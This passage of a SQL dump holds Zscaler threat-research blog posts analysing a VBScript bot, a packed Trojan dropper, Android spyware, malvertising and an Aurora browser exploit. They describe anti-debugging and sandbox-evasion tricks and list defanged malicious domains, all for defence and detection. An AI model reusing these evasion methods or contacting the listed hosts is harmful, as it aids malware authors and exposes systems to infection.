system startup.(Figure 4)                	  		  			  		  		  			Figure 4: Windows Registry (run entry)  		  	                  It also adds a copy of itself to the Windows temporary folder (Figure 5).                     	  		  			  		  		  			Figure 5: Copy of Malware in temp folder  		  	                     Next, the malware attempts to establish a connection to it\'s server (here wscript.exe is the Script Engine which executes VBScript).                          	  		  			  		  		  			Figure 6: Network communication  			   		  	                To extract more information we need to decode the file and obtain the original malware code in a readable form. Let\'s have a look at the decoded file.                     	  		  			  		  		  			Figure 7: Malware install code  		  	                  The image above shows the code that is responsible for adding entry in the registry which     allows the malware to execute every time the system starts , Also create it\'s own copy in the startup, temporary folder.         Another interesting part of this malware is it\'s ability to communicate over the network. The malware can actually receive a set of commands and execute them in an infected machine    At the time of analysis, the server to which the malware communicates seems to be down. Therefore, in order to fully understand how the malware communicates and also to demonstrate how effective and damaging this Bot is, I have decided to create an HTTP server and issue commands to the bot directly.         We can see from the code below, the wide range of commands that can be executed by this Bot. The commands are simple and self explanatory.                 	  		  			  		  		  			Figure 8: Remote Commands  		  	                     Let\'s see the effects of a few of these commands in detail. The “execute” command is capable of executing additional VBScript statements in the infected machine. The “update” command is issued to update the Bot , while “uninstall” removes the Bot entry from the Windows registry and startup folder.         There are also commands such as “send”, ”recv” and “site-send”. Interesting commands include “enum-driver”, “enum-faf”, “enum-process”, “cmd-shell”, “delete”, “exitprocess”.         Let us execute our server and wait for the Bot to connect to us and send information so we can then issue commands.                	  		  			  		  		  			Figure 9: Malware callback  		  	                As seen in the image above, a “POST” request is made with it\'s path as “/is-ready”, indicating    that the Bot is up and ready. We can also observe information about the infected machine such as “volumeserialnumber”, “computername”, “username”,“operating system type”, installed    “anti-virus name” etc. To retrieve such information, the malware relies on Windows Management Instrumentation (WMI) queries.         Let us issue the command “enum-driver”. This command fetches the drive name and drive type of the infected machine as seen in the image below.           	  		  			  		  		  			Figure 10: enum-drive  		  	             The next command “enum-faf” enumerates and fetches the content of an input directory or drive of the infected machine.                	  		  			  		  		  			Figure 11: enum files   		  	                  The “enum-process” command fetches a list of processes that are running on the infected system.                	  		  			  		  		  			Figure 12: enum-process  		  	        The “cmd-shell” command will allow the attacker to execute all DOS commands on the infected    system.                	  		  			  		  		  			Figure 13: Execute Dos Command  		  	                     Those are just a few of the powerful commands that the malware can execute in the infected system. This gives the malware near limitless power to control and steal data from the infected machine. The Bot and all it\'s communication are blocked by Zscaler.', 'Analysis;Compromise;Malware;Phishing', 'https://www.zscaler.com/blogs/research/analysis-vbscript-bot');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (204, 'The Story Of A Trojan Dropper III', 'ThreatLabz', 'January 09, 2014', 'Introduction:    In previous posts (story of Trojan dropper part I, II) we performed both static and dynamic analysis on the threat and also developed a broad idea of what the malware was doing in it’s initial stages. We now set out to investigate the reason behind the crash of the dropped file (“Adobe.exe”) and at the same time we want to retrieve the payload from this particular malware sample.    Analysis:    Let’s go ahead and debug the file. This file (“Adobe.exe”) was found to be packed (custom variant) and the unpacking routine is similar to the approach detailed in part II of this post, so let’s skip all the gory details and dive right into it.    After unpacking the entire binary in memory, control is transferred to a newly unpacked region at the address \"0x401634\". Now the action begins from here and we get our first decryption routine, which is a simple 1-byte XOR with a static key as seen in the image below which reveals more code         	  		  			  		  		  			Figure 1: Decrypt code  		  	      If we carefully look at the new code below, we can observe that it is riddled with JMP instructions and occasionally we find a few garbage values. The code is crafted in such a way that it resists disassemble attempts which makes reverse engineering the sample more difficult and somewhat painful.    Hidden in between these JMP’s in plain sight is an instruction that is familiar to us by now(i.e the instruction to fetch the address of PEB (Process Environment Block)).         	  		  			  		  		  			Figure 2: Fetch address of PEB  		  	      At this point we can only speculate on why the malware needs the PEB address. Moving further in the code, we encounter another decryption point that is exactly same as the first one, which decrypts more code. Now the control is transferred to the newly decrypted code.         	  		  			  		  		  			Figure 3: NtGlobalFlag (anti-debug)  		  	      In the image above, we have an interesting bit of code. Recall that the malware already collected the address of PEB. At this point, using the instruction CMP DWORD PTR DS:[EDI+68], ECX (here EDI holds the address of PEB which is \"0x7FFD4000\" and ECX holds a constant 0x70 ) a comparison is performed, after which a JNZ instruction decides the fate of the control flow.    Here we get our first glimpse of the anti-debugging technique employed by this malware. The instruction CMP DWORD PTR DS:[EDI+68], ECX compares the value of the ECX register (i.e. 0x70) to the location in the PEB structure known as “NtGlobalFlag”. The field is set to a value of “0x70”, if the process is spawned under a debugger.    In our case, this is true since we are debugging the file. Finally, the JNZ instruction at \"0x401511\" is not taken, which lands us in an invalid region in memory, thus triggering the anti-debugging. Let’s jump here and continue with our analysis. We now have another layer of decryption, which reveals more code after which, as usual, control is transferred to this region.    We then reach another piece of code, which is revealed only if we keep up with the control flow.         	  		  			  		  		  			Figure 4: File-path, name identification (anti-debug)  		  	    The above code uses “strstr” to look for a string named “sample” anywhere in file path of our currently debugged file. If found, “strstr” returns a pointer to first occurrence of search string(i.e \"sample\") in file-path, or else it returns zero. The malware then checks the return value in EAX and takes a conditional jump in the form of JE instruction at \"0x401135\". If the jump is not taken, the code lands in “ExitProcess”, a call which terminates the process.    This is the second anti-debugging technique the malware employs, although not-an effective one in my opinion considering the odds of a file-path or malware name containing the name “sample”.         	  		  			  		  		  			Figure 5: GetVolumeinformation, Volumeserial (anti-debug)  		  	      Again, here we have another anti-debugging technique where the malware retrieves the Volumeserial number using the API GetVolumeinformation and compares it with  “0CD1A40” and “70144646”. If either comparison matches, the code jumps to the ExitProcess call.    Another anti-debugging technique follows immediately thereafter in the form of “EnumSystemLocalesA”. The first argument that \"EnumSystemLocalesA\" accepts is a pointer to the callback function. Here the malware does a neat trick. If we look at the code below, at address “0x401179” a constant “0x2” is pushed onto the stack, which is followed immediately by a CALL.     When this CALL is executed, it pushes the return address onto the top of the stack (which is \"0x401180\") and the EIP (Instruction pointer) now lands at the \"EnumSystemLocalesA\" call. Now if we observe the stack, the value on top of the stack is the return address, which naturally becomes the callback function address for \"EnumSystemLocalesA\" . When the \"EnumSystemLocalesA\" API is executed, control falls to the callback function, which continues the execution of the code.          	  		  			  		  		  			Figure 6: EnumSystemLocalesA (anti-debug)  		  	      Let\'s now continue our debugging from the address “0x401180”. Not far from here, yet another anti- debugging technique is uncovered. This time the malware retrieves the ‘Diskname’ from the registry.          	  		  			  		  		  			Figure 7: Diskname (anti-debug)  		  	      \"RegOpenKeyExA\" (HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Disk\\Enum)  and  \"RegQueryValueExA\" then uses “strstr” and searches for signs of a virtual environment such as “Xen”, “Vmware”, “Qemu” and also looks for string “virtual”.         	  		  			  		  		  			Figure 8: Search vm strings(anti-debug)  		  	    Once the malware detects a virtual environment, it changes the control flow and land us in an invalid memory region. If we play along, we can observe something interesting here.         	  		  			  		  		  			Figure 9: Adobe.exe crash  		  	    There we go. We can finally reproduce the crash that happened during the first stage of our analysis.  Ok, so a through binary analysis is often not so straight forward after all !!!       	  		  			  		  		  			Figure 10: sandbox identification(anti-debug)  		  	    Let’s move on and see what surprises the malware has this time. Below, we can see anotherpiece of code that checks for a DLL name called “sbiedll” . Here, the malware checks whether it is run in a popular sandbox called “sandboxie”. If found, as usual, the malware bails out.      Immediately afterward, the malware performs a decryption routine to reveal compressed data, which is again packed with aplib and below we can observe the aplib unpacking routine which decompresses the data to a PE file.         	  		  			  		  		  			Figure 11: Aplib decompression routine  		  	      Soon after, control is passed to the newly decompressed file. Below, we can see the new file being executed.         	  		  			  		  		  			Figure 12: New PE-file in memory  		  	      Debugging further, we can observe the malware revealing the final trick that it has up it’s sleeve ,which I will explain in the next post in this series.', 'Analysis;Encryption;Malware', 'https://www.zscaler.com/blogs/research/story-trojan-dropper-iii');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (205, 'Want To Spy? Google Play Will Help You', 'Viral Gandhi', 'January 09, 2014', 'Spyware or legitimate monitoring application? You decide. In this blog we\'ll discuss a \'legitimate\' app that can be purchased in Google Play known as SMS Tracker. Now it\'s legitimate as it advertises exactly what it does, but based how this same application is packaged and distributed in other markets, it\'s clear that the vendor is also targeting another, less altruistic audience with this same application. The app also illustrates the powerful access permissions that an application can gain so long as the end user agrees to it, either explictly or otherwise.    Details about the application:    Name: SMS Tracker.    Installs: 10,000-15,000.    Description: http://smstracker.com/    As per the description on the application’s Google Play page, the application is able to do the following:           	SMS Tracking – Intercepts text messages. Read all inbound and outbound text messages. Details include time and date, phone number, contact name and location of the target phone. Complete Text message tracking and logging.  	MMS tracking - Intercepts MMS multimedia messages. Read and view all inbound and outbound MMS messages. See what photos are sent to and from the target phone. Details include photo, time and date, phone number, contact name and location of the target phone.  	Browser Tracking – monitors all web browser activity on the target phone. Know which websites were visited, which pages were viewed and when.  	GPS Tracking – Logs GPS location information wich can later be viewed on a map. Know when and where the phone was located at all times. Breadcrumbs to record location information allowing parents to locate their children at frequent intervals. GPS logging occurs at a user defined rate (default interval is 5 minutes). Remote GPS logging and viewing give you the ability to see the location of your child’s phone, from any web browser. The breadcumb trail offers powerful GPS Tracking.  	Call Logging – Monitors all inbound, outbound and missed calls. Identifies the phone number, contact name, call duration, and location of the phone for every call.  	If you want to know where your kids are, just send them a text message. The location of the phone is  	recorded every time it sends or receives a text message.  	Tracking of System Events, including Device Powered On/Off, Device Attached / Removed to/from the charger, Apps installed/removed/updated.  	Silently monitor all inbound and outbound SMS messages.              How the app can be used?         First you need to download the application and install it on the device on which you want to spy. After installing an application you need to register it. Next, you need to go to http://smstracker.com, where you will be asked for your login name and password ,which was registered at a time of installing the application.           This screenshot shows the dashboard after login.             This screenshot shows the page where you can see logging from the device. It covers SMS, device information, call logs, network traffic, location details, etc.              Zscaler’s concerns:         In any other context, an application with these capabilities would clearly be labelled as spyware. At the vendor\'s (https://smstrackerweb.com/download.php) they are selling a repackaged version of this app which has the same functionality but does not leave an icon on the device, thus making it more stealthy and harder to detect following installation. This version also does not contain the notification icon or privacy policy screen. Why the transparency? What audience is this version targeting?         This same application could also serve generic template for other spyware projects by being wrapped with other code to provide the core functionality needed to create another malicious app.          This type of app clearly shows the powerful level of access that can be granted to Android apps, so long as users grant permission. An app can access SMS, call logs, network traffic, hardware details, screen details etc. Always carefully read the permissions requested by an application before installing it on your device.              The vendor is promoting this application as a tool for monitoring the mobile activities of your children. However, this same app would be a very effective tool for spying on someone once installed on their phone. You just need to install the app on the device which you want to spy and you are done. All the information about the device and all call and SMS logs can then be remotely monitored.         Moreover, all of the user\'s private data is stored on the vendor\'s server. What guarantees are in place that the private data will remain private? In the increasingly common enterprise world of “Bring Your Own Device” (BYOD), such applications could be leveraged to expose corporate contact lists, email, browsing information and collect private data from corporate apps in the workplace. Enterprises often block access to \'non-official\' app stores to prevent the installation of such apps, but this illustrates that such a restriction is no guaruntee that spyware can\'t be installed from an official source.              Virustotal scan results:    The application available from the vendor site (smstracker.com):         https://www.virustotal.com/en/file/21aa6c6652287413f07ddfbcadea84441a500ee12816dfe4beed913e4a0fa636/analysis/    The Google Play store’s version:         https://www.virustotal.com/en/file/a3b40fa9fea9600b55d4d07fd4f0358ee74e6924c342c5857c2a5311f7a11ed3/analysis/         Interestingly, despite virtually the same functionality, far fewer AV vendors flag the Google Play version as malicious.              - Viral', 'Mobile', 'https://www.zscaler.com/blogs/research/want-spy-google-play-will-help-you');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (206, 'Yahoo Ad Server Compromise Recap', 'Chris Mannon', 'January 06, 2014', 'Malware writers had a big week to start off the new year by using Yahoo Advertisement services to peddle their warez.  The talent over at Fox-IT broke the story last week which set Team Z on the hunt.    The primary focus of our attention was on the Magnitude EK (Exploit Kit), which was distributed via a Malvertising campaign designed to infect the maximum number of users in a small amount of time.  These attacks are particularly dangerous to websites who rely on advertising revenue to fund their sites activities.  Protecting Ad servers should be held to a higher scrutiny than other content distribution channels for this very reason.  If user\'s find themselves at risk more often than they prefer , then they will adopt ad-blocking applications such as AdBlock.    This attack started at precisely Wed Jan 01 23:17:05.  The attack lasted all through Friday the 3rd, until Yahoo and other researchers caught onto this treachery and promptly put a stop to it.  We track the last transaction serving up malware from ads.yahoo.com/* at approximately Fri Jan 03 02:16:48.  In that time, the following domains were seen to host a malicious iFrame from an ads.yahoo.com transaction:    blistartoncom[.]org/  slaptoniktons[.]net/         yagerass[.]org/     original-filmsonline[.]com/     funnyboobsonline[.]org/      These domains would redirect the user to a Magnitude EK with a randomly generated hostname to attempt hindering researcher\'s ability to track the threat.  However all these sites were hosted on the same IP address hosted in the Netherlands (193.169.245.78).    201116.pzmu.nsv.ha.ywyh.ya.fmpryuyqoz.crisisreverse[.]net  201111.inrx.itlqojqjton.boxsdiscussing[.]net  201111.jz.ek.al.psx.pfzzypjydv.limitingbeyond[.]net  201111.cd.da.mlx.dupn.sci.rdwxbioveahx.boxsdiscussing[.]net  201111.fef.mma.rdwxbioveahx.boxsdiscussing[.]net  201111.kxox.jgru.oktl.rdwxbioveahx.boxsdiscussing[.]net  201116.yphu.ixrwpvewnkui.limitingbeyond[.]net  201111.ygiv.wdh.ioycntlg.boxsdiscussing[.]net  201116.cx.zq.ixrwpvewnkui.limitingbeyond[.]net  201111.wi.kyk.vm.bq.ioycntlg.boxsdiscussing[.]net  201111.qx.pp.amuq.gp.fz.txlqbyjrlcl.crisisreverse[.]net  201117.lgr.duohlqzrzqw.limitingbeyond[.]net  201311.urho.ru.pis.tf.ixrwpvewnkui.limitingbeyond[.]net  201311.kpxt.twqr.fse.rpcq.ixrwpvewnkui.limitingbeyond[.]net  201117.sy.mp.kc.qd.loty.duohlqzrzqw.limitingbeyond[.]net  201116.md.jpij.ezj.pdu.cinmvjurxop.boxsdiscussing[.]net  201117.zmb.pshi.ldf.xqk.duohlqzrzqw.limitingbeyond[.]net  201311.fex.qhpz.pje.gfu.xvroferresd.liechecks[.]net  201111.qhh.orit.tka.bwqvkvvaithe.suggestsfilm[.]net  201111.txz.rrjh.wdx.uvh.uqgz.paftwtdqc.limitingbeyond[.]net    Other root domains include:    chapterwild[.]net  elsecommenting[.]net  farmtrains[.]net  federalpoet[.]net  irritatedpound[.]net  layfriend[.]net  suggestsfilm[.]net    In the time that this threat was active, an approx total of 21,000 transactions occurred.  This speaks to the effectiveness of malvertising campaigns.  A single site compromise yields only victim\'s who frequent that site, a ad server compromise not only affects that site, but also all sites which use advertisements from the site.  Malware writers will continue to find methods to cast the largest possible net to rope in more victim\'s to their dubious activities.    At this time, we are still investigating all aspects of the threat in a postmortem process.  It\'s been reported that the compromise propagated the following malware families:                	Zbot  	Andromeda  	Dorkbot  	Various Adware  	Tinba  	Necurs        ThreatLabZ will continue to monitor this threat.', 'Compromise', 'https://www.zscaler.com/blogs/research/yahoo-ad-server-compromise-recap');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (207, 'The Story Of A Trojan Dropper I', 'ThreatLabz', 'December 29, 2013', 'Introduction:         Recently, Zscaler ThreatlabZ  received a suspicious file from one of our customers, which     was named “OrderDetails.zip”. After extracting the executable file from the archive I have   performed a virustotal scan  to get some information about the file. At that time, very   few antivirus vendors had definitions in place, which flagged the file as malicious.         As such, I decided to take look at the file in greater detail. After completing the analysis,  I\'ve  decided to blog about the threat. Given the amount of information derived during the analysis, I\'ve decided to divide the blog into multiple parts.        Modern day malware generally implements some kind of packing or obfuscation on the binary, in order to evade antivirus detection. Hence, it’s a good idea to determine which packer may have been used while analyzing the file. In order to do this, I implemented a popular tool called PEiD to check for the existence of a known packer.     As we can see above, PEiD was not able to pick up anything from this file, but that doesn\'t mean that the file is not packed. Let’s have a closer look at the file.    While going through the file sections, one of the sections (.data) contained an unusually large amount of data, which at first glance gave the impression that it is obfuscated. This is an important clue and something we have to keep in mind while debugging the file.         While looking at the resource section, we can see that the file icon resembles that of a PDF file, which adds to our suspicion. Also, the file is not digitally signed.    Lets go further and execute the file. When doing so, I was greeted with a crash report where Windows was telling me that “Adobe.exe” had crashed during execution.    We knew from the beginning that this was not a proper PDF file and would not therefore work with Adobe Reader. Let’s now look to determine where Adobe.exe exists in the file system. A   Windows file search reveals Adobe.exe inside the temp folder, which when executed, produces exactly the same result as was shown above          	  	               At the same time, a Wireshark capture was not able to output anything that was of interest.At this point we have adequate evidence to proceed with additional debugging, which i will explain in detail in the 2nd part of this blog post. The story of a Trojan dropper II', 'Analysis;AntiVirus;Encryption;Malware', 'https://www.zscaler.com/blogs/research/story-trojan-dropper-i');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (208, 'The Story Of A Trojan Dropper II', 'ThreatLabz', 'December 28, 2013', 'Analysis:    Lets analyze the PE file in detail and see what it’s up to. Like most malware, this sample was packed and in order to properly analyze it, we must begin by unpacking the binary. Keeping this in mind, I began by debugging the file, hoping to find the reference to the data section in order to determine precisely where the encrypted portion of data was to be found.    Fortunately, I was not disappointed and was soon able to find the reference point.         	  		  			  		  		  			Figure 1: Obfuscated data   		  	      After further debugging, we are able to see the code decrypted in memory. The decryption occurs in multiple iterations, until the data is completely decrypted.         	  		  			  		  		  			Figure 2: Decryption of obfuscated data  		  	      Now we have a full view of the decrypted code in memory. The portion that was decrypted contains position independent code (i.e shellcode).         	  		  			  		  		  			Figure 3: Decrypted data in memory  		  	      Since the code is decrypted in memory, we can assume that at some point, control will be transferred to that region, which in this case happens immediately. We also can see that the VirtualProtectEx API is used to change the protection of the memory region and by doing so the malware will be able to execute and manipulate the memory.           	  		  			  		  		  			Figure 4: Change memory protection  		  	      After this occurs, control is transferred to the region by an instruction of JMP EDI. Here, EDI will hold the address to which EIP (instruction pointer) lands and we can see that it is the same portion of the   code that was decrypted earlier.                  	  		  			  		  		  			Figure 5: Control transferred to new code  		  	           There\'s an interesting bit of code here if we look at first couple of instructions on the landed region. We can see a NOP instruction, followed by SUB EAX,EAX and a CALL and POP EBX. If we carefully observe the address that is called, it is that of the POP EBX. This is a common technique found in shellcode and file infectors where one needs to get the address of the region that is currently being executed.       When this CALL is executed, it pushes the return address onto the stack (in this case it is the address of POP EBX). Now POP EBX is executed, as that instruction pops the value from the top of the stack to EBX. The address is then added to a constant of 0x33, to point to the region that is then decrypted by the decryption loop. This reveals more code, after which a JMP instruction transfers the control to the newly revealed code.    Further, I was able to identify another interesting piece of code here. The code below retrieves the address of the PEB (process environment block) and navigates to PEB_LDR_DATA->InLoadOrderModuleList, where it retrieves the names of the loaded modules (DLL’s) .         	  		  			  		  		  			Figure 6: Fetch base address of kernel32.dll  		  	      There\'s another catch here. The malware looks for specific DLL’s (in this case kernel32.dll), but instead of using the string kernel32.dll to compare with retrieved module names from the PEB, it carries the hash of the DLL names and then calculates the hash value for the retrieved module names and compares them. This allows the malware to make minimum noise and avoid some antivirus rules.         	  		  			  		  		  			Figure 7: Dll name hash   		  	      Once the malware gets kernel32.dll, it then retrieves the base address of the kernel32.dll, which in this case is 0x7c800000. Now, using the PE file format, the malware moves to the export table of kernel32.dll, as illustrated in the code below,         	  		  			  		  		  			Figure 8:  Finding exportaddresstable of kernel32.dll  		  	      Looking at code above the instruction MOV EBX, DWORD PTR DS:[EAX+78], lands us at the datadirectory-->exportaddresstable of the kernel32.dll. The malware then retrieves the value and adds it to the imagebase (ie 0x7c800000) in order to reach the export table, where it retrieves the address of the exported function. Here too, the malware never uses the names of the function, but instead it uses a stored hash.       After further analysis, we stumble onto another piece of code, which copies data again from the data section to a newly allocated memory region.           	  		  			  		  		  			Figure 9: Copy more data   		  	      Investigating further, we see that this data is decrypted to reveal what looks like some sort of an address table.         	  		  			  		  		  			Figure 10: Address table   		  	      The table has significance as it is used as an address calculator, To calculate the address of  the region from where it copies bulk data, Which is further decrypted to form what looks like    a compressed file.         	  		  			  		  		  			Figure 11: Compressed data  		  	      And there it is. Moving ahead, we land in the decompression routine, which quickly reveals that  the data is compressed using “aplib”.             	  		  			  		  		  			Figure 12: Aplib decompression routine  		  	           Once the decompression is completed it does some familiar actions by flushing out the bytes of the original EXE file starting from the imagebase 0x400000 and copy the decompressed data to its new imagebase (i.e 0x400000)         	  		  			  		  		  			Figure 13: Copy decompressed PE -file   		  	      Finally using “LoadlibraryEx” and Getprocaddress the IAT is rebuild in the memory after which the control is transferred to the new code at the address 0x401021         	  		  			  		  		  			Figure14: Rebuild IAT in memory  		  	      The job of this code is limited. It writes a PE-file which is embedded within itself into the temporary folder as “Adobe.exe” using the api “GetTempPathA”.         	  		  			  		  		  			Figure 15: Transfer control to OEP  		  	      In the end, the file (Adobe.exe) is dropped in the temp folder and executed using the API “ShellExecuteA”.         	  		  			  		  		  			Figure 16: Execute dropped \"Adobe.exe\"  		  	      A dummy PDF file is also written to the current directory named “Bestellung.pdf”. In a subsequent blog post, we will see why the malware dropped this PDF file.    That’s all for now. In the next post, we’ll continue the analysis of the dropped file “Adobe.exe”', 'Analysis;AntiVirus;Malware', 'https://www.zscaler.com/blogs/research/story-trojan-dropper-ii');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (209, 'Infection Found On ‘feedburner.com’', 'ThreatLabz', 'December 26, 2013', 'Recently, we have seen the websites of MySQL and PHP.net being compromised. We have also blogged about Google Code being used as a drop site for holding malicious code.  These instances clearly suggest that attackers are targeting popular websites and using them in their attacks as they are less likely to be blocked by URL filters. This time we found that Google acquired ‘FeedBurner’, which provides custom RSS feeds and management tools to users is hosting an infected page. We found that one of the pages on the sub-domain ‘feeds.feedburner.com’ is serving malicious JavaScript.  The JavaScript is obfuscated and contains an iFrame, which after execution, redirects the user to a malicious website. More information about this particular attack can be found in McAfee\'s description of threat JS/Exploit-Blacole.em.\r\n\r\nLet’s look at the infection in detail.\r\n\r\nURL: hxxp://feeds.feedburner.com/bileblog\r\n\r\nThe following shows the redirection trace when visiting the aforementioned URL.\r\n\r\nNetwork Trace:  \r\n \r\n\r\n\r\n\r\nThe redirection chain above case is as follows:\r\nhxxp://feeds.feedburner.com/bileblog (Drops JavaScript Trojan)\r\n--> hxxp://rsnvlbgcba.ibiz.cc/d/404.php?go=1  (Intermediate Redirection)\r\n--> hxxp://fukbb.com/\r\n\r\nLet’s take a look at a beautified version of the obfuscated JavaScript Trojan code which is dropped:\r\n \r\n\r\n\r\n\r\nJavaScript Trojan code generally contains two main sections. The first is the decoder routine (i.e JavaScript code which decodes the embedded payload) and the second is the payload itself. Generally attackers keep on tweaking the decoder routine and payload to evade security vendors.\r\n\r\nThe de-obfuscated version of the code above can be seen here:\r\n \r\n\r\n\r\n\r\nThe de-obfuscated code loads an iFrame into the victim’s browser, which is redirecting the user to ‘hxxp://rsnvlbgcba.ibiz.cc/d/404.php?go=1’, which in turn redirects it to ‘hxxp://fukbb.com/’.\r\n\r\nThe source code hosted at ‘hxxp://rsnvlbgcba.ibiz.cc/d/404.php?go=1’ is a simple redirect:\r\n\r\n   \r\n\r\n Final re-directed page:\r\n \r\n\r\n\r\n\r\nCurrently, ‘hxxp://fukbb.com’ is not serving any malicious code but the reputation of this site is found to be suspicious (Refer the VT link below). The page could however be revived at some point in the future. ThreatLabZ informed FeedBurner about this infection on 12/26/2013.\r\n\r\nVT Reports:\r\nFile scan for JavaScript Trojan code: 24/49\r\nURL scan on ‘hxxp://rsnvlbgcba.ibiz.cc/d/404.php?go=1’ :  2/51\r\nURL scan on ‘hxxp://fukbb.com/’ :  3/51\r\n\r\nZULU Report:\r\nURL Scan on ‘hxxp://feeds.feedburner.com/bileblog’: 100/100\r\n\r\nSimilar instances of this infection have been found on ‘http://celebrityshowdown.net/?feed=rss2’, which is also an RSS feed management site. The following is the network trace seen when visiting this URL.\r\n \r\n\r\n\r\n\r\nThe redirection chain observed in this case is as follows:\r\nhxxp://celebrityshowdown.net/?feed=rss2    \r\n--> hxxp://rhtbjgw.ibiz.cc/?go=2\r\n--> hxxp://fukbb.com/\r\n\r\nFor a detailed report about this infections check the urlQueryreport.\r\n\r\nWe continue to see similar infections using malicious JavaScript injected into legitimate sites to redirect users to malicious sites on a daily basis. Most of the time the infected sites haven’t specifically been targeted, but have become infected during larger attacks conducted using browser exploit kits designed to automate the infection of as many sites as possible. We advise our readers to use online URL scanning tools such as ZULU to perform scans on URLs when suspicious, regardless of a site’s perceived reputation.\r\n\r\n- pradeep', 'Analysis;Compromise;Evasion/Stealth', 'https://www.zscaler.com/blogs/research/infection-found-feedburnercom');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (210, 'Analysis Of ATN Live TV IOS App Using ZAP', 'Rubin Azad', 'December 22, 2013', '“As the Mobile Industry is moving so fast, so too do security and Privacy issues”         There has been rapid growth in the prevalence of mobile devices in last few years. Every day a new device is being launched and hence increasing the number of online transactions. BYOD (Bring Your Own Device) has further complicated the security challenges of enterprises as they’re now responsible for protecting data on devices that they don’t own. At the same time, mobile application developers are coding new apps every day, without focusing on security/privacy related issues.    In this Post we will focus on analyzing the ATN Live TV App for iOS using our own free service ZAP(Zscaler Application Profiler). If you aren’t familiar with ZAP, it’s a simple web application which allows anyone to quickly analyze the security/privacy issues of any iOS or Android app by dynamically inspecting the web traffic generated by the app. Please have a look at our previous blog post or videofor more information.         Let’s begin.                  App Name: ATN Live TV    App Store link: https://itunes.apple.com/in/app/atn-live-tv/id525948724?mt=8    Category: Entertainment                                                 You will need to provide the APP URL and some fake credential to ZAP in order to analyze the traffic for security/privacy leaks.                       Once you are done with this, you’ll need to set the proxy setting on your device to point to ZAP. Hit the Proxy Scan button and follow the instructions for setting the proxy on your particular device.    In this analysis, we found that ATN Live TV is leaking passwords and Email IDs.                                As you can see, the Email ID and the MD5 hashed password is being transferred to the server via GET request using HTTP. While the password is hashed via MD5, you can see that the data is not transmitted in an encrypted (HTTPS) channel. While MD5 is a one-way hash, an attacker that was able to sniff this traffic, could perform a dictionary attack to retrieve the clear text password.    Here is the Final Risk Score Report of ATN Live TV app from ZAP.              Conclusion    With the explosion of mobile app development, we’re seeing an increase in data and privacy leaks. This is occurring for the same reason that we saw so many web application vulnerabilities a decade ago – there are many new developers entering the space but few have access to the tools and knowledge necessary to develop secure apps and apps are often published without an independent security audit.    These issues were reported to the developer on 20/12/2013.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/analysis-atn-live-tv-ios-app-using-zap');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (211, 'Aurora Exploit Still Floating ...', 'ThreatLabz', 'December 17, 2013', 'It\'s been around two years since Microsoft released a patch for the IE 0day famously known as the Aurora exploit (CVE-2010-0249). We had blogged about this in the past when it was first seen in the wild on the \'GOV.CN\' domain. This vulnerability targets IE version 6. Despite the passage of time, we continue to find live exploits for this vulnerability. Recently, we found a new URL which is serving the Aurora exploit code.         Exploit URL: hxxp://www.artbridal.com/bizcodi/gm/news.html         Let\'s take a look at the exploit code being delivered.                              The exploit is delivered via obfuscated JavaScript code, although the level of obfuscation is not very high. Some of the strings and JavaScript function names are been obfuscated. The following is a snapshot of the de-obfuscated code.                  If you observe the first image, the SPAN tag holds an IMG tag on which the \'onload\' event calls an event handler  function \'eve\'. This in turn creates an event object called \'e1\', using the \'document.createEventObject\' method. Then, by using an \'.innerHTML\' property, it assigns a null string to SPAN object \'sp1\', but instead, the \'sp1\' object is removed. In the function \'eve\', the freed object is referenced, causing memory corruption in the form of an access violation in IE. To exploit this condition, the exploit code uses a typical heap spray technique to load the shellcode into memory for the execution. When the shellcode is executed, it tries to download a malicious file from the URL \'hxxp://fly-tld.ru/w.php?f=47&e=3\'.  For a more detailed analysis, you can refer to this blog.    To obtain the aforementioned URL, the PE executable file was formed and extracted from the shell code in the exploit. The EXE was then examined using a debugger to extract the URL as can be seen below.                       This URL is down at the moment, so further post exploitation analysis was not possible.         Reports:    VT URL Scan on found URL : 4/51 detections.    VT File Scan on EXE formed from Shellcode: 27/41 detections.       Various other URLs that have been seen in the past with similar patterns - \'/w.php?f=(\\d){2}&e=(\\d){1,2}\' include:    hxxp://synergyledlighting.net/w.php?f=56&e=4  hxxp://nicesextubes.co/w.php?f=18&e=6   hxxp://iplaecrcocee.com/w.php?f=26&e=2  hxxp://iplaecrcocee.com/w.php?f=26&e=2  hxxp://examine.arsb.co.uk/w.php?f=20&e=2  hxxp://exciting.simssocialcheat.com/w.php?f=22&e=2  hxxp://oyacromifh.com/w.php?f=26&e=2  hxxp://eteaescopr.com/w.php?f=26&e=2     The obvious reason behind attacking old CVE\'s is the belief of attackers, that there are still un-patched and outdated browser\'s out there on end user machines. Sadly, they\'re correct. To avoid such attacks we suggest updating browsers with latest patches and migrating to the most recent version of the browser.     Stay updated, Stay Safe!    Pradeep', 'Analysis;APT;Exploit;Malware;Microsoft;Vulnerability', 'https://www.zscaler.com/blogs/research/aurora-exploit-still-floating');
